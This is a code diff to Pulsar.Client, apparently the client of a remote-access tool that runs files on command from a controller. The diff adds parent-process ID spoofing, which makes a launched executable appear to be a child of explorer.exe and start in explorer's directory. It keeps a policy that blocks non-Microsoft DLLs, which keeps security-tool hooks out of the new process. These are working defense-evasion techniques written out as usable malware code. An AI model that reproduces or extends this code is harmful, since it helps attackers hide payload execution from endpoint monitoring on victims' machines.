@@ -423,49 +423,83 @@ namespace Pulsar.Client.Messages
                 var si = new Utilities.NativeMethods.STARTUPINFOEX();
                 si.StartupInfo.cb = Marshal.SizeOf(typeof(Utilities.NativeMethods.STARTUPINFOEX));
 
+                // Get explorer.exe PID and directory for spoofing
+                var (parentPid, parentDirectory) = GetExplorerPidAndDirectory();
+                SendStatus($"Using PPID spoofing with parent: {parentPid}");
+                SendStatus($"Using directory: {parentDirectory}");
+
                 // ---- ATTRIBUTE LIST ----
                 IntPtr attrSize = IntPtr.Zero;
 
-                // First call retrieves required bytes
+                // First call retrieves required bytes (2 attributes: PPID + mitigation)
                 Utilities.NativeMethods.InitializeProcThreadAttributeList(
-                    IntPtr.Zero, 1, 0, ref attrSize);
+                    IntPtr.Zero, 2, 0, ref attrSize);
 
                 si.lpAttributeList = Marshal.AllocHGlobal(attrSize);
 
                 if (!Utilities.NativeMethods.InitializeProcThreadAttributeList(
-                    si.lpAttributeList, 1, 0, ref attrSize))
+                    si.lpAttributeList, 2, 0, ref attrSize))
                 {
                     throw new Exception("InitializeProcThreadAttributeList failed.");
                 }
 
+                IntPtr parentProcessHandle = IntPtr.Zero;
+                IntPtr lpValueProc = IntPtr.Zero;
+
                 try
                 {
-                    ulong policy =
-                        Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+                    // Set PPID spoofing
+                    parentProcessHandle = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, parentPid);
+                    if (parentProcessHandle == IntPtr.Zero)
+                    {
+                        int error = Marshal.GetLastWin32Error();
+                        throw new Exception($"OpenProcess failed for PPID: 0x{error:X8}");
+                    }
+
+                    lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
+                    Marshal.WriteIntPtr(lpValueProc, parentProcessHandle);
+
+                    // Update attribute for PPID spoofing
+                    ulong ppidValue = (ulong)parentProcessHandle.ToInt64();
+                    if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
+                        si.lpAttributeList,
+                        0,
+                        (IntPtr)0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+                        ref ppidValue,
+                        (IntPtr)IntPtr.Size,
+                        IntPtr.Zero,
+                        IntPtr.Zero))
+                    {
+                        int error = Marshal.GetLastWin32Error();
+                        throw new Exception($"UpdateProcThreadAttribute (PPID) failed: 0x{error:X8}");
+                    }
+
+                    // Set block non-Microsoft DLLs policy
+                    ulong policy = Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
 
                     if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
                         si.lpAttributeList,
                         0,
-                        (IntPtr)Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                        Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                         ref policy,
                         (IntPtr)sizeof(ulong),
                         IntPtr.Zero,
                         IntPtr.Zero))
                     {
-                        throw new Exception("UpdateProcThreadAttribute failed.");
+                        throw new Exception("UpdateProcThreadAttribute (Mitigation) failed.");
                     }
 
                     // ---- CREATE PROCESS ----
                     bool ok = Utilities.NativeMethods.CreateProcess(
                         null,
-                        tempPath,
+                        $"\"{tempPath}\"", // Quote the path in case of spaces
                         IntPtr.Zero,
                         IntPtr.Zero,
                         false,
                         Utilities.NativeMethods.EXTENDED_STARTUPINFO_PRESENT,
                         IntPtr.Zero,
-                        null,
-                        ref si,    // << FIXED — correct struct type
+                        parentDirectory, // Use explorer.exe directory for spoofing
+                        ref si,
                         out pi
                     );
 
@@ -475,27 +509,32 @@ namespace Pulsar.Client.Messages
                         Utilities.NativeMethods.CloseHandle(pi.hThread);
 
                         _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                        SendStatus("Process executed with mitigation policy.");
+                        SendStatus($"Process executed with PPID spoofing and mitigation policy (PID: {pi.dwProcessId})");
                     }
                     else
                     {
+                        // Fallback without spoofing
                         Process.Start(new ProcessStartInfo
                         {
                             FileName = tempPath,
-                            UseShellExecute = true
+                            UseShellExecute = true,
+                            WorkingDirectory = parentDirectory
                         });
 
                         _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                        SendStatus("Executed via fallback Process.Start().");
+                        SendStatus("Executed via fallback Process.Start()");
                     }
                 }
                 finally
                 {
+                    // Cleanup
                     if (si.lpAttributeList != IntPtr.Zero)
                     {
                         Utilities.NativeMethods.DeleteProcThreadAttributeList(si.lpAttributeList);
                         Marshal.FreeHGlobal(si.lpAttributeList);
                     }
+                    if (lpValueProc != IntPtr.Zero) Marshal.FreeHGlobal(lpValueProc);
+                    if (parentProcessHandle != IntPtr.Zero) CloseHandle(parentProcessHandle);
                 }
             }
             catch (Exception ex)
@@ -505,6 +544,50 @@ namespace Pulsar.Client.Messages
             }
         }
 
+        // Add these missing methods and enums to your class
+        private (uint pid, string directory) GetExplorerPidAndDirectory()
+        {
+            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
+            if (explorerProcesses.Length > 0)
+            {
+                var explorer = explorerProcesses[0];
+                string directory;
+
+                try
+                {
+                    // Try to get the actual working directory of explorer.exe
+                    directory = Path.GetDirectoryName(explorer.MainModule.FileName);
+                    if (string.IsNullOrEmpty(directory))
+                    {
+                        // Fallback to Windows directory
+                        directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+                    }
+                }
+                catch
+                {
+                    // Fallback to Windows directory if we can't access the process
+                    directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+                }
+
+                return ((uint)explorer.Id, directory);
+            }
+            throw new Exception("No explorer.exe process found for PPID spoofing");
+        }
+
+        // Add these P/Invoke declarations to your NativeMethods class or use existing ones
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [Flags]
+        private enum ProcessAccessFlags : uint
+        {
+            PROCESS_CREATE_PROCESS = 0x0080,
+            PROCESS_QUERY_INFORMATION = 0x0400,
+            PROCESS_VM_READ = 0x0010
+        }
         private Dictionary<int, int?> GetParentProcessMap()
         {
             var map = new Dictionary<int, int?>();
